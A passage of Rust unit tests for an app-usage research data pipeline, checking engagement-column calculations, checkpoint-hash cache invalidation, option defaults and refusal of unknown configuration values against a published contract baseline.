            data.interaction_type = (*interaction).into();
            data.start_timestamp_ns = Some(*start * SECOND);
            data.stop_timestamp_ns = Some(*stop * SECOND);
        }

        // Hash every row before the walk, so a cache the walk fails to discard
        // is still holding the pre-walk value afterwards.
        let mut scratch = RowCheckpointScratch::default();
        for row in &rows {
            row_checkpoint_parts(row, &mut scratch);
        }

        add_app_usage_detail_columns(&mut rows, custom_duration);

        #[allow(clippy::type_complexity)]
        let observed: Vec<(i32, i32, i32, f64, i32, i32, i32, f64)> = rows
            .iter()
            .map(|row| {
                (
                    row.valid_app_new_engage_30s,
                    row.valid_app_new_engage_custom,
                    row.valid_app_switched_app,
                    row.valid_app_usage_time_gap_hours,
                    row.any_app_new_engage_30s,
                    row.any_app_new_engage_custom,
                    row.any_app_switched_app,
                    row.any_app_usage_time_gap_hours,
                )
            })
            .collect();
        assert_eq!(
            observed,
            vec![
                // No previous session at all: both flags fire, nothing switched.
                (1, 1, 0, 0.0, 1, 1, 0, 0.0),
                // Exactly thirty seconds is not "more than thirty seconds".
                (0, 0, 0, 30.0 / 3600.0, 0, 0, 0, 30.0 / 3600.0),
                // Exactly the study threshold is not "more than" it either, but
                // three hundred seconds is more than thirty, and the app moved.
                (1, 0, 1, 300.0 / 3600.0, 1, 0, 1, 300.0 / 3600.0),
                // A filtered session leaves the valid_* columns untouched at
                // their defaults and takes only the any_* measurement.
                (0, 0, 0, 0.0, 1, 0, 1, 31.0 / 3600.0),
                // The next real session measures back past the filtered one for
                // valid_* (a hundred seconds, from the video session) and back
                // to it for any_* (forty seconds).
                (1, 0, 1, 100.0 / 3600.0, 1, 0, 1, 40.0 / 3600.0),
            ]
        );

        for (index, row) in rows.iter().enumerate() {
            let cached = row_checkpoint_parts(row, &mut scratch);
            let fresh = row_checkpoint_parts(&Row::new(row.0.data.clone()), &mut scratch);
            assert_eq!(
                cached, fresh,
                "row {index} kept a checkpoint component the walk changed",
            );
        }

        // Re-running the walk over rows that already carry engagement columns —
        // which is what happens whenever an upstream step re-emits a row — has
        // to restore any column that disagrees with the measurement *and*
        // discard the checkpoint component that described the old value. Each
        // column is disturbed on its own, so exactly one of the four change
        // tests, and exactly one term inside it, is the reason the row is
        // rewritten. A term that stops contributing therefore leaves either a
        // stale column or a stale digest.
        fn engagement(data: &RowData) -> (i32, i32, i32, u64, i32, i32, i32, u64) {
            (
                data.valid_app_new_engage_30s,
                data.valid_app_new_engage_custom,
                data.valid_app_switched_app,
                data.valid_app_usage_time_gap_hours.to_bits(),
                data.any_app_new_engage_30s,
                data.any_app_new_engage_custom,
                data.any_app_switched_app,
                data.any_app_usage_time_gap_hours.to_bits(),
            )
        }

        const ENGAGEMENT_COLUMNS: [&str; 8] = [
            "any_app_new_engage_30s",
            "any_app_new_engage_custom",
            "any_app_switched_app",
            "any_app_usage_time_gap_hours",
            "valid_app_new_engage_30s",
            "valid_app_new_engage_custom",
            "valid_app_switched_app",
            "valid_app_usage_time_gap_hours",
        ];
        // No measurement can produce these, so any column left holding one was
        // never rewritten.
        const WRONG_FLAG: i32 = -7;
        const WRONG_HOURS: f64 = -7.0;

        let settled: Vec<RowData> = rows.iter().map(|row| row.0.data.clone()).collect();
        for (column, name) in ENGAGEMENT_COLUMNS.iter().enumerate() {
            for target in 0..settled.len() {
                // The walk only owns the valid_* columns of unfiltered
                // sessions; a filtered row keeps whatever it was handed.
                if column >= 4 && settled[target].interaction_type != APP_USAGE {
                    continue;
                }
                let mut perturbed: Vec<Row> = settled.iter().cloned().map(Row::new).collect();
                let data = perturbed[target].edit_all();
                match column {
                    0 => data.any_app_new_engage_30s = WRONG_FLAG,
                    1 => data.any_app_new_engage_custom = WRONG_FLAG,
                    2 => data.any_app_switched_app = WRONG_FLAG,
                    3 => data.any_app_usage_time_gap_hours = WRONG_HOURS,
                    4 => data.valid_app_new_engage_30s = WRONG_FLAG,
                    5 => data.valid_app_new_engage_custom = WRONG_FLAG,
                    6 => data.valid_app_switched_app = WRONG_FLAG,
                    _ => data.valid_app_usage_time_gap_hours = WRONG_HOURS,
                }
                // Hash the disturbed state, so a component the walk fails to
                // discard is still describing the wrong value afterwards.
                for row in &perturbed {
                    row_checkpoint_parts(row, &mut scratch);
                }

                add_app_usage_detail_columns(&mut perturbed, custom_duration);

                for (index, (row, expected)) in perturbed.iter().zip(&settled).enumerate() {
                    assert_eq!(
                        engagement(row),
                        engagement(expected),
                        "row {index} after {name} was disturbed on row {target}",
                    );
                    let cached = row_checkpoint_parts(row, &mut scratch);
                    let fresh = row_checkpoint_parts(&Row::new(row.0.data.clone()), &mut scratch);
                    assert_eq!(
                        cached, fresh,
                        "row {index} kept a checkpoint component describing the \
                         old {name} disturbed on row {target}",
                    );
                }
            }
        }
    }

    #[test]
    fn cached_row_checkpoint_invalidates_only_the_edited_component() {
        let csv = concat!(
            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
            "Study,P01,Target Child,Chat,Activity Resumed,com.example.chat,2026-03-07 10:00:00,America/Chicago\n"
        );
        let raw = incremental::decode_source_records(csv.as_bytes());
        let model = incremental::attach_device_models(&raw);
        let mut row = incremental::canonicalize_source_rows(
            &raw,
            "America/Chicago",
            &BTreeMap::new(),
            &model,
        )
        .expect("canonical row")
        .remove(0);
        let mut scratch = RowCheckpointScratch::default();
        let baseline = row_checkpoint_parts(&row, &mut scratch);
        assert!(row.0.checkpoint_parts.identity.get().is_some());
        assert!(row.0.checkpoint_parts.temporal.get().is_some());
        assert!(row.0.checkpoint_parts.classification.get().is_some());

        let hour = row.hour.saturating_add(1);
        *row.edit_temporal().hour = hour;
        assert!(row.0.checkpoint_parts.identity.get().is_some());
        assert!(row.0.checkpoint_parts.temporal.get().is_none());
        assert!(row.0.checkpoint_parts.classification.get().is_some());
        let changed = row_checkpoint_parts(&row, &mut scratch);
        assert_eq!(baseline.identity, changed.identity);
        assert_ne!(baseline.temporal, changed.temporal);
        assert_eq!(baseline.classification, changed.classification);

        let fresh = Row::new(row.0.data.clone());
        let fresh_parts = row_checkpoint_parts(&fresh, &mut scratch);
        assert_eq!(
            changed, fresh_parts,
            "component cache must match a cold hash"
        );

        *row.edit_classification().application_label = "Changed".into();
        assert!(row.0.checkpoint_parts.identity.get().is_some());
        assert!(row.0.checkpoint_parts.temporal.get().is_some());
        assert!(row.0.checkpoint_parts.classification.get().is_none());
        let changed_again = row_checkpoint_parts(&row, &mut scratch);
        assert_eq!(changed.identity, changed_again.identity);
        assert_eq!(changed.temporal, changed_again.temporal);
        assert_ne!(changed.classification, changed_again.classification);

        row.index += 1;
        assert!(row.0.checkpoint_parts.identity.get().is_none());
        assert!(row.0.checkpoint_parts.temporal.get().is_none());
        assert!(row.0.checkpoint_parts.classification.get().is_none());

        // A persisted row that carries checkpoint parts is foreign (the
        // encoder writes None): the decoder hashes the data, never the parts.
        let forged = with_serialized_row_string_table(|| {
            postcard::to_allocvec(&PersistedRowRef {
                data: &row.0.data,
                identity: Some([7; 16]),
                temporal: Some([7; 16]),
                classification: Some([7; 16]),
            })
        })
        .expect("encode forged row");
        let decoded: Row = with_deserialized_row_string_pool(|| {
            postcard::from_bytes(&forged).expect("decode forged row")
        });
        assert_eq!(
            row_checkpoint_parts(&decoded, &mut scratch),
            row_checkpoint_parts(&Row::new(row.0.data.clone()), &mut scratch),
        );
    }

    /// The browser sends option JSON carrying only the settings it means to
    /// state, so every field with a serde default is a published product
    /// default: omitting it has to produce exactly this value. The four
    /// screen-gated crediting defaults and the compliance threshold are the
    /// researcher-facing ones. `usage_session_mode` also has a documented
    /// fallback, and `materialize_visualization_data`, when omitted, follows
    /// whether either view surface is on.
    #[test]
    fn omitted_option_fields_take_their_published_defaults() {
        let minimal = serde_json::json!({
            "study_name": "Study",
            "timezone": "UTC",
            "usage_session_mode": "app_usage",
            "include_app_output": true,
            "include_screen_output": true,
            "use_filter_file": false,
            "use_apps_forcing_screen_open": false,
            "use_app_codebook": false,
            "correct_duplicate_event_timestamps": true,
            "allow_stop_event_reuse": false,
            "use_activity_stopped_as_fallback": true,
            "apply_threshold_to_fallback": true,
            "long_duration_threshold_ns": 43_200_000_000_000_i64,
            "custom_app_engagement_duration": 300.0,
            "long_data_time_gap_thresholds": [1.0],
            "long_usage_duration_thresholds": [1.0],
            "same_app_stop_types": ["Activity Paused"],
            "other_stop_types": ["Activity Resumed"],
            "interaction_types_to_remove": [],
            "screen_auto_lock_timeout_seconds": 120.0,
            "screen_auto_lock_tolerance_seconds": 30.0,
            "screen_manual_lock_max_tail_seconds": 30.0,
            "screen_keyguard_near_stop_seconds": 2.0,
            "datetime_of_preprocessing": "2026-07-21 12:00:00 UTC",
        });
        let parsed: PipelineV2OptionsJson =
            serde_json::from_value(minimal.clone()).expect("the minimal request parses");

        assert_eq!(parsed.timezone_handling, "selected-convert");
        assert_eq!(parsed.aggregate_shape, "wide");
        assert_eq!(parsed.compliance_threshold_percent, 70.0);
        assert_eq!(parsed.credited_session_cap_minutes, 360.0);
        assert_eq!(parsed.device_liveness_gap_tolerance_minutes, 120.0);
        assert_eq!(parsed.auto_lock_bridge_seconds, 120.0);
        assert_eq!(parsed.no_witness_min_day_apps, 2);
        assert_eq!(parsed.opener_set, "strategy_defined");
        assert_eq!(parsed.proximity_interval_ns, 2_000_000_000);
        assert_eq!(parsed.filter_match_field.value(), "app_package_name");
        assert!(parsed.application_label_exclusions.value().is_empty());
        assert_eq!(*parsed.aggregate_top_apps_limit.value(), 0);
        assert_eq!(parsed.micro_use_classification_policy.value(), "none");
        assert_eq!(*parsed.minimum_usage_duration.value(), 0.0);
        assert_eq!(parsed.minimum_duration_comparator.value(), "strict_lt");
        assert_eq!(
            parsed.minimum_duration_disposition.value(),
            "chronicle_blank_keep_row",
        );
        for omitted in [
            parsed.micro_use_classification_policy.is_omitted(),
            parsed.minimum_usage_duration.is_omitted(),
            parsed.minimum_duration_comparator.is_omitted(),
            parsed.minimum_duration_disposition.is_omitted(),
            parsed.filter_match_field.is_omitted(),
            parsed.application_label_exclusions.is_omitted(),
            parsed.aggregate_top_apps_limit.is_omitted(),
        ] {
            assert!(omitted, "an absent B03/B04 key remains absent");
        }
        let converted = parsed.clone().into_pipeline_options();
        assert!(!converted.micro_use_classification_policy_explicit);
        assert!(!converted.minimum_usage_duration_explicit);
        assert!(!converted.minimum_duration_comparator_explicit);
        assert!(!converted.minimum_duration_disposition_explicit);
        let omitted_wire = serde_json::to_value(&parsed).expect("omitted options reserialize");
        for key in [
            "micro_use_classification_policy",
            "minimum_usage_duration",
            "minimum_duration_comparator",
            "minimum_duration_disposition",
            "filter_match_field",
            "application_label_exclusions",
            "aggregate_top_apps_limit",
        ] {
            assert!(
                omitted_wire.get(key).is_none(),
                "omitted key {key} reappeared"
            );
        }
        let mut explicit_request = minimal.clone();
        explicit_request["micro_use_classification_policy"] = "none".into();
        explicit_request["minimum_usage_duration"] = 60.0.into();
        explicit_request["minimum_duration_comparator"] = "strict_lt".into();
        explicit_request["minimum_duration_disposition"] = "chronicle_blank_keep_row".into();
        explicit_request["filter_match_field"] = "app_package_name".into();
        explicit_request["application_label_exclusions"] = serde_json::json!([]);
        explicit_request["aggregate_top_apps_limit"] = 0.into();
        let explicit_parsed: PipelineV2OptionsJson =
            serde_json::from_value(explicit_request).expect("explicit defaults parse");
        let explicit_wire =
            serde_json::to_value(&explicit_parsed).expect("explicit options reserialize");
        for key in [
            "micro_use_classification_policy",
            "minimum_usage_duration",
            "minimum_duration_comparator",
            "minimum_duration_disposition",
            "filter_match_field",
            "application_label_exclusions",
            "aggregate_top_apps_limit",
        ] {
            assert!(
                explicit_wire.get(key).is_some(),
                "explicit key {key} disappeared"
            );
        }
        let explicit_converted = explicit_parsed.into_pipeline_options();
        assert!(explicit_converted.micro_use_classification_policy_explicit);
        assert!(explicit_converted.minimum_usage_duration_explicit);
        assert!(explicit_converted.minimum_duration_comparator_explicit);
        assert!(explicit_converted.minimum_duration_disposition_explicit);
        assert_eq!(parsed.materialize_visualization_data, None);
        assert!(parsed.interaction_type_remap.is_empty());
        for (field, on) in [
            ("deduplicate_exact_rows", parsed.deduplicate_exact_rows),
            ("enable_plotting", parsed.enable_plotting),
            ("enable_activity_heatmap", parsed.enable_activity_heatmap),
            (
                "include_app_usage_end_reason",
                parsed.include_app_usage_end_reason,
            ),
        ] {
            assert!(on, "{field} defaults on");
        }
        for (field, on) in [
            ("use_background_apps_file", parsed.use_background_apps_file),
            ("include_category_column", parsed.include_category_column),
            ("model_concurrent_usage", parsed.model_concurrent_usage),
            (
                "apply_minimum_usage_duration_to_concurrent_subintervals",
                parsed.apply_minimum_usage_duration_to_concurrent_subintervals,
            ),
            (
                "filter_zero_duration_sessions",
                parsed.filter_zero_duration_sessions,
            ),
            (
                "add_no_activity_placeholder_days",
                parsed.add_no_activity_placeholder_days,
            ),
            (
                "enable_study_window_filter",
                parsed.enable_study_window_filter,
            ),
            (
                "enable_person_attribution",
                parsed.enable_person_attribution,
            ),
            ("enable_day_coverage", parsed.enable_day_coverage),
            (
                "enable_compliance_scoring",
                parsed.enable_compliance_scoring,
            ),
            (
                "enable_screen_gated_crediting",
                parsed.enable_screen_gated_crediting,
            ),
            ("enable_aggregates", parsed.enable_aggregates),
            (
                "enable_participant_amount_summary",
                parsed.enable_participant_amount_summary,
            ),
            ("export_plots_as_svg", parsed.export_plots_as_svg),
            (
                "neutralize_spreadsheet_formulas",
                parsed.neutralize_spreadsheet_formulas.unwrap_or(false),
            ),
            (
                "bridge_screen_off_to_session_end",
                parsed.bridge_screen_off_to_session_end.unwrap_or(false),
            ),
            (
                "enable_interactive_timeline",
                parsed.enable_interactive_timeline,
            ),
            (
                "include_filtered_app_usage_in_plots",
                parsed.include_filtered_app_usage_in_plots,
            ),
        ] {
            assert!(!on, "{field} defaults off");
        }

        for (spelling, expected) in [
            ("no_usage", UsageSessionMode::NoUsage),
            ("screen_usage", UsageSessionMode::ScreenUsage),
            ("app_and_screen_usage", UsageSessionMode::AppAndScreenUsage),
            ("app_usage", UsageSessionMode::AppUsage),
        ] {
            let mut request = minimal.clone();
            request["usage_session_mode"] = spelling.into();
            let options = serde_json::from_value::<PipelineV2OptionsJson>(request)
                .expect("the request parses")
                .into_pipeline_options();
            assert_eq!(
                options.usage_session_mode, expected,
                "usage_session_mode {spelling}",
            );
        }
        // The runtime plans app and screen work from this string, so a spelling
        // the kernel does not know is refused instead of running as app usage
        // under a plan that says nothing runs.
        for spelling in ["something else entirely", "appUsage", "screen_usage "] {
            let mut request = minimal.clone();
            request["usage_session_mode"] = spelling.into();
            let error = serde_json::from_value::<PipelineV2OptionsJson>(request)
                .expect_err("an unknown mode is refused");
            assert!(error.to_string().contains("unknown_usage_session_mode"), "{error}");
        }

        let mut request = minimal.clone();
        request["opener_set"] = serde_json::Value::Null;
        let options = serde_json::from_value::<PipelineV2OptionsJson>(request)
            .expect("a null opener set is the omitted spelling")
            .into_pipeline_options();
        assert_eq!(options.opener_set, OpenerSet::StrategyDefined);

        // An unknown arm is refused and named, never read as the default: the
        // default is a different computation from the one that was asked for.
        for (field, spelling) in [
            ("opener_set", "future_narrow_arm"),
            ("micro_use_classification_policy", "future_micro_policy"),
            ("minimum_duration_comparator", "future_comparator"),
            ("minimum_duration_disposition", "future_disposition"),
        ] {
            let mut request = minimal.clone();
            request[field] = spelling.into();
            let error = serde_json::from_value::<PipelineV2OptionsJson>(request)
                .expect_err("an unknown arm is refused");
            assert!(
                error.to_string().contains(&format!("unknown_{field}: \"{spelling}\"")),
                "{error}",
            );
        }

        let mut request = minimal.clone();
        request["minimum_duration_comparator"] = 7.into();
        assert!(
            serde_json::from_value::<PipelineV2OptionsJson>(request).is_err(),
            "a malformed B04 field type must be rejected instead of widened",
        );

        let mut request = minimal.clone();
        request["screen_session_construction_strategy"] = "future_screen_arm".into();
        let error = serde_json::from_value::<PipelineV2OptionsJson>(request)
            .expect_err("an unknown B05 strategy must fail closed");
        assert!(error
            .to_string()
            .contains("unknown_screen_session_construction_strategy"));

        for (plotting, timeline, expected) in [
            (false, false, false),
            (true, false, true),
            (false, true, true),
            (true, true, true),
        ] {
            let mut request = minimal.clone();
            request["enable_plotting"] = plotting.into();
            request["enable_interactive_timeline"] = timeline.into();
            let options = serde_json::from_value::<PipelineV2OptionsJson>(request)
                .expect("the request parses")
                .into_pipeline_options();
            assert_eq!(
                options.materialize_visualization_data, expected,
                "plotting={plotting} timeline={timeline}",
            );
        }

        let mut request = minimal;
        request["enable_plotting"] = true.into();
        request["materialize_visualization_data"] = false.into();
        let options = serde_json::from_value::<PipelineV2OptionsJson>(request)
            .expect("the request parses")
            .into_pipeline_options();
        assert!(
            !options.materialize_visualization_data,
            "an explicit materialize_visualization_data has to win over the view settings",
        );
    }

    /// The committed snapshot of the researcher-facing contract: every option's
    /// key, type and default, and every enum option's values, rebuilt from the
    /// LinkML schema and diffed by `npm run check:contract`, so it cannot
    /// disagree with `chronicle-local-contract.linkml.yaml`.
    const CONTRACT_BASELINE: &str = include_str!("../../../web/schema/contract-baseline.json");

    fn contract_baseline() -> serde_json::Value {
        serde_json::from_str(CONTRACT_BASELINE).expect("contract-baseline.json is JSON")
    }

    /// The request key and wire value `buildRustV2Options` sends for one
    /// contract option, or `None` for the two execution-only options the
    /// browser never sends to the kernel. Everything not renamed here is the
    /// camelCase key in snake_case, unchanged.
    fn contract_option_as_request(
        key: &str,
        value: &serde_json::Value,
    ) -> Option<(String, serde_json::Value)> {
        let scaled = |factor: f64| {
            serde_json::Value::from((value.as_f64().expect("a number") * factor).round() as i64)
        };
        let (request_key, request_value) = match key {
            "parallelProcessing" | "parallelMaxWorkers" => return None,
            "processAppUsage" => ("include_app_output", value.clone()),
            "processScreenUsage" => ("include_screen_output", value.clone()),
            // `options.selectedTimezone?.trim() || "UTC"`.
            "selectedTimezone" => (
                "timezone",
                match value.as_str() {
                    Some(zone) if !zone.trim().is_empty() => value.clone(),
                    _ => "UTC".into(),
                },
            ),
            "useAppsForcingScreenOpenFile" => ("use_apps_forcing_screen_open", value.clone()),
            "longDurationThresholdHours" => ("long_duration_threshold_ns", scaled(3_600_000_000_000.0)),
            "longDurationThresholdHoursExplicit" => ("long_duration_threshold_explicit", value.clone()),
            "proximityIntervalSeconds" => ("proximity_interval_ns", scaled(1_000_000_000.0)),
            "sameAppInteractionTypesToStopUsageAt" => ("same_app_stop_types", value.clone()),
            "otherInteractionTypesToStopUsageAt" => ("other_stop_types", value.clone()),
            "screenUsageAutoLockTimeoutSeconds" => ("screen_auto_lock_timeout_seconds", value.clone()),
            "screenUsageAutoLockToleranceSeconds" => {
                ("screen_auto_lock_tolerance_seconds", value.clone())
            }
            "screenUsageManualLockMaxTailGapSeconds" => {
                ("screen_manual_lock_max_tail_seconds", value.clone())
            }
            "screenUsageKeyguardNearStopSeconds" => {
                ("screen_keyguard_near_stop_seconds", value.clone())
            }
            other => {
                let mut snake = String::with_capacity(other.len() + 8);
                for character in other.chars() {
                    if character.is_ascii_uppercase() {
                        snake.push('_');
                        snake.push(character.to_ascii_lowercase());
                    } else {
                        snake.push(character);
                    }
                }
                return Some((snake, value.clone()));
            }
        };
        Some((request_key.to_string(), request_value))
    }

    /// The request the browser builds from the contract's default options.
    /// A `null` default is an option the browser omits until it is chosen.
    fn contract_default_request() -> serde_json::Map<String, serde_json::Value> {
        let baseline = contract_baseline();
        let options = baseline["options"].as_object().expect("options");
        let mut request = serde_json::Map::new();
        for (key, record) in options {
            let default = &record["default"];
            if default.is_null() {
                continue;
            }
            if let Some((request_key, value)) = contract_option_as_request(key, default) {
                request.insert(request_key, value);
            }
        }
        // Not contract options: derived from the two process toggles, and the
        // runtime's run timestamp.
        let app = options["processAppUsage"]["default"] == true;
        let screen = options["processScreenUsage"]["default"] == true;
        request.insert(
            "usage_session_mode".into(),
            match (app, screen) {
                (true, true) => "app_and_screen_usage",
                (true, false) => "app_usage",
                (false, true) => "screen_usage",
                (false, false) => "no_usage",
            }
            .into(),
        );
        request.insert(
            "datetime_of_preprocessing".into(),
            "2026-07-21 12:00:00 UTC".into(),
        );
        request
    }

    fn parse_request(
        request: &serde_json::Map<String, serde_json::Value>,
    ) -> Result<PipelineV2OptionsJson, serde_json::Error> {
        serde_json::from_value(serde_json::Value::Object(request.clone()))
    }

    /// AI-built C7: the kernel's serde defaults are a second copy of the
    /// contract defaults, and the old test compared them with literals, so
    /// the two copies could drift with every test green (the contract says
    /// 2 s of proximity grace and the activity heatmap on; an omitted key read
    /// 0 s and off). Every key the browser sends is removed in turn: the
    /// kernel must then either refuse the request (the key has no kernel
    /// default) or produce exactly what the contract default produces.
    #[test]
    fn every_kernel_option_default_is_the_contract_default() {
        fn same(left: &serde_json::Value, right: &serde_json::Value) -> bool {
            match (left, right) {
                (serde_json::Value::Number(left), serde_json::Value::Number(right)) => {
                    left.as_f64() == right.as_f64()
                }
                (serde_json::Value::Array(left), serde_json::Value::Array(right)) => {
                    left.len() == right.len()
                        && left.iter().zip(right).all(|(left, right)| same(left, right))
                }
                _ => left == right,
            }
        }
        // The effective configuration, with the presence bits cleared: an
        // omitted key and an explicit default are the same value and differ
        // only in how they are receipted.
        fn effective(options: PipelineV2OptionsJson) -> String {
            let mut options = options.into_pipeline_options();
            options.micro_use_classification_policy_explicit = false;
            options.minimum_usage_duration_explicit = false;
            options.minimum_duration_comparator_explicit = false;
            options.minimum_duration_disposition_explicit = false;
            options.screen_session_construction_strategy_explicit = false;
            format!("{options:?}")
        }

        let request = contract_default_request();
        let full = parse_request(&request)
            .unwrap_or_else(|error| panic!("the contract-default request parses: {error}"));
        let full_effective = effective(full);
        let mut kernel_required = std::collections::BTreeSet::new();
        let mut drift = Vec::new();
        for key in request.keys() {
            if matches!(key.as_str(), "usage_session_mode" | "datetime_of_preprocessing") {
                continue;
            }
            let mut omitted = request.clone();
            omitted.remove(key);
            let Ok(parsed) = parse_request(&omitted) else {
                kernel_required.insert(key.as_str());
                continue;
            };
            let wire = serde_json::to_value(&parsed).expect("options reserialize");
            match wire.get(key) {
                Some(kernel) if !kernel.is_null() => {
                    if !same(kernel, &request[key]) {
                        drift.push(format!(
                            "{key}: contract default {}, kernel default {kernel}",
                            request[key]
                        ));
                    }
                }
                _ => {
                    if effective(parsed) != full_effective {
                        drift.push(format!(
                            "{key}: omitting it computes something other than the contract default {}",
                            request[key]
                        ));
                    }
                }
            }
        }
        assert!(drift.is_empty(), "kernel defaults drifted from the contract: {drift:#?}");
        // Named, not counted: a key that loses its kernel default is a choice.
        assert_eq!(
            kernel_required,
            std::collections::BTreeSet::from([
                "allow_stop_event_reuse",
                "apply_threshold_to_fallback",
                "correct_duplicate_event_timestamps",
                "custom_app_engagement_duration",
                "include_app_output",
                "include_screen_output",
                "interaction_types_to_remove",
                "long_data_time_gap_thresholds",
                "long_duration_threshold_ns",
                "long_usage_duration_thresholds",
                "other_stop_types",
                "same_app_stop_types",
                "screen_auto_lock_timeout_seconds",
                "screen_auto_lock_tolerance_seconds",
                "screen_keyguard_near_stop_seconds",
                "screen_manual_lock_max_tail_seconds",
                "study_name",
                "timezone",
                "use_activity_stopped_as_fallback",
                "use_app_codebook",
                "use_apps_forcing_screen_open",
                "use_filter_file",
            ]),
        );
    }

    /// AI-built C3/K2: every enum option the contract publishes, each value
    /// through the real request parser into the typed configuration, the
    /// kernel's arms equal to the contract's values in both directions, and
    /// a value outside them refused and named rather than computed as the
    /// default. The older parity test covered five of these axes.
    #[test]
    fn every_contract_enum_option_round_trips_and_an_unknown_arm_is_refused() {
        type Effective = fn(&PipelineV2Options) -> String;
        fn ids<T: Copy>(arms: &[T], id: fn(T) -> &'static str) -> Vec<&'static str> {
            arms.iter().map(|arm| id(*arm)).collect()
        }
        fn axis(request_key: &str) -> (Vec<&'static str>, Effective) {
            match request_key {
                "timezone_handling" => (TIMEZONE_HANDLING_MODES.to_vec(), |o| o.timezone_handling.clone()),
                "aggregate_shape" => (AGGREGATE_SHAPES.to_vec(), |o| o.aggregate_shape.clone()),
                "event_retention_set" => (ids(&EventRetentionSet::ALL, EventRetentionSet::canonical_id), |o| o.event_retention_set.canonical_id().into()),
                "opener_set" => (ids(&OpenerSet::ALL, OpenerSet::canonical_id), |o| o.opener_set.canonical_id().into()),
                "episode_reconstruction_strategy" => (ids(EpisodeReconstructionStrategy::ALL, EpisodeReconstructionStrategy::canonical_id), |o| o.episode_reconstruction_strategy.canonical_id().into()),
                "micro_use_classification_policy" => (ids(&MicroUseClassificationPolicy::ALL, MicroUseClassificationPolicy::canonical_id), |o| o.micro_use_classification_policy.canonical_id().into()),
                "day_boundary_attribution" => (ids(&DayBoundaryAttribution::ALL, DayBoundaryAttribution::canonical_id), |o| o.day_boundary_attribution.canonical_id().into()),
                "filter_match_field" => (ids(&FilterMatchField::ALL, FilterMatchField::canonical_id), |o| o.filter_match_field.canonical_id().into()),
                "package_exclusion_preset" => (ids(&PackageExclusionPreset::ALL, PackageExclusionPreset::canonical_id), |o| o.package_exclusion_preset.canonical_id().into()),
                "minimum_duration_comparator" => (ids(&MinimumDurationComparator::ALL, MinimumDurationComparator::canonical_id), |o| o.minimum_duration_comparator.canonical_id().into()),
                "minimum_duration_disposition" => (ids(&MinimumDurationDisposition::ALL, MinimumDurationDisposition::canonical_id), |o| o.minimum_duration_disposition.canonical_id().into()),
                "interval_quality_policy" => (ids(&IntervalQualityPolicy::ALL, IntervalQualityPolicy::canonical_id), |o| o.interval_quality_policy.canonical_id().into()),
                "session_grouping_policy" => (ids(SessionGroupingPolicy::ALL, SessionGroupingPolicy::canonical_id), |o| o.session_grouping_policy.canonical_id().into()),
                "session_gap_basis" => (ids(SessionGapBasis::ALL, SessionGapBasis::canonical_id), |o| o.session_gap_basis.canonical_id().into()),
                "session_boundary_scope" => (ids(SessionBoundaryScope::ALL, SessionBoundaryScope::canonical_id), |o| o.session_boundary_scope.canonical_id().into()),
                "screen_session_construction_strategy" => (ids(&ScreenSessionConstructionStrategyId::ALL, ScreenSessionConstructionStrategyId::canonical_id), |o| o.screen_session_construction_strategy.canonical_id().into()),
                "screen_session_classification_policy" => (ids(&ScreenSessionClassificationPolicy::ALL, ScreenSessionClassificationPolicy::canonical_id), |o| o.screen_session_classification_policy.canonical_id().into()),
                "screen_session_maximum_duration_disposition" => (ids(&ScreenSessionMaximumDurationDisposition::ALL, ScreenSessionMaximumDurationDisposition::canonical_id), |o| o.screen_session_maximum_duration_disposition.canonical_id().into()),
                "locked_screen_audio_disposition" => (ids(&LockedScreenAudioDisposition::ALL, LockedScreenAudioDisposition::canonical_id), |o| o.locked_screen_audio_disposition.canonical_id().into()),
                "interaction_type_removal_mode" => (ids(&InteractionTypeRemovalMode::ALL, InteractionTypeRemovalMode::canonical_id), |o| o.interaction_type_removal_mode.canonical_id().into()),
                "screen_gating_rule" => (ids(&ScreenGatingRule::ALL, ScreenGatingRule::canonical_id), |o| o.screen_gating_rule.canonical_id().into()),
                "notification_proxy_rule" => (ids(&NotificationProxyRule::ALL, NotificationProxyRule::canonical_id), |o| o.notification_proxy_rule.canonical_id().into()),
                "polled_emulation_method" => (ids(&PolledEmulationMethod::ALL, PolledEmulationMethod::canonical_id), |o| o.polled_emulation_method.canonical_id().into()),
                "interval_expansion_method" => (ids(&IntervalExpansionMethod::ALL, IntervalExpansionMethod::canonical_id), |o| o.interval_expansion_method.canonical_id().into()),
                // B06 travels as a set and is resolved, typed, after parsing.
                "maximum_duration_policy" => (ids(&b06::MaximumDurationPolicy::ALL, b06::MaximumDurationPolicy::canonical_id), |o| o.maximum_duration.policy.clone().unwrap_or_default()),
                "maximum_duration_disposition" => (ids(&b06::MaximumDurationDisposition::ALL, b06::MaximumDurationDisposition::canonical_id), |o| o.maximum_duration.disposition.clone().unwrap_or_default()),
                "maximum_duration_threshold_source" => (ids(&b06::MaximumDurationThresholdSource::ALL, b06::MaximumDurationThresholdSource::canonical_id), |o| o.maximum_duration.threshold_source.clone().unwrap_or_default()),
                other => panic!("{other} is a contract enum option this test has no row for"),
            }
        }
        const B06_SELECTION: [(&str, &str); 3] = [
            ("maximum_duration_policy", "strategy_native"),
            ("maximum_duration_disposition", "not_applicable"),
            ("maximum_duration_threshold_source", "strategy_native"),
        ];
        const UNKNOWN: &str = "not_a_contract_arm";

        let baseline = contract_baseline();
        let options = baseline["options"].as_object().expect("options");
        let enums = baseline["enums"].as_object().expect("enums");
        // Research axes are keyed by their option; the two plain contract
        // enums by their enum name.
        let mut contract_axes: Vec<(String, Vec<String>)> = enums
            .iter()
            .filter(|(key, _)| options.contains_key(*key))
            .map(|(key, values)| (key.clone(), serde_json::from_value(values.clone()).expect("values")))
            .collect();
        for (option, enum_name) in [
            ("timezoneHandling", "TimezoneHandlingMode"),
            ("aggregateShape", "AggregateShape"),
        ] {
            contract_axes.push((
                option.into(),
                serde_json::from_value(enums[enum_name].clone()).expect("values"),
            ));
        }
        assert_eq!(contract_axes.len(), 27, "contract enum options: {:?}", contract_axes.iter().map(|(key, _)| key).collect::<Vec<_>>());

        let base = contract_default_request();
        for (browser_key, values) in &contract_axes {
            let (request_key, _) =
                contract_option_as_request(browser_key, &serde_json::Value::Null).expect("sent");
            let (arms, effective) = axis(&request_key);
            let mut declared: Vec<&str> = values.iter().map(String::as_str).collect();
            let mut implemented = arms.clone();
            declared.sort_unstable();
            implemented.sort_unstable();
            assert_eq!(implemented, declared, "{request_key}: kernel arms vs contract values");

            let b06 = B06_SELECTION.iter().any(|(key, _)| *key == request_key);
            let with = |value: &str| {
                let mut request = base.clone();
                if b06 {
                    for (key, arm) in B06_SELECTION {
                        request.insert(key.into(), arm.into());
                    }
                }
                request.insert(request_key.clone(), value.into());
                request
            };
            for value in values {
                let options = parse_request(&with(value))
